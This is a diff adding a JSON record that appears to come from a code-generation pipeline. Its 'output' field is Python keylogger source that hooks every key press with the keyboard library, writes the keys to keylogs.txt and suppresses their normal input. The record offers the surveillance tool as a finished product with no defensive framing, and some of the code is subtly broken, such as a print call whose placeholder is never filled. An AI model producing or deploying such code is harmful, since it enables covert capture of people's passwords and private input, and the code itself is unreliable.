@@ -1,0 +1,6 @@
+{
+  "output": "import keyboard\nimport time\n\nlogfile = \"keylogs.txt\"\n\ndef write_to_log(event):\n    with open(logfile, \"a\", encoding=\"utf-8\") as f:\n        if event.name == 'space':\n            f.write('\\n')\n        elif event.name == 'enter':\n            f.write(\"[{0}]\\n\".format(event.name.upper()))\n        elif event.name == 'backspace':\n            f.write(\"[{0}]\\n\".format(event.name.upper()))\n        elif len(event.name) > 1:\n            f.write(\"{}\\n\".format(event.name.lower()[1:]))\n        else:\n            f.write(event.name)\n        print(\"Logged: \\\"{}\\\"\", event.name)\n    return True\n\ntry:\n    keyboard.on_press(write_to_log, suppress=True)\n    while 1:\n        time.sleep(0.01)\n\nexcept (KeyboardInterrupt, SystemExit):\n    print(\"Exiting...\")",
+  "notes": "Re-attempt first generation",
+  "applied_fixes": [],
+  "iterations": 7
+}
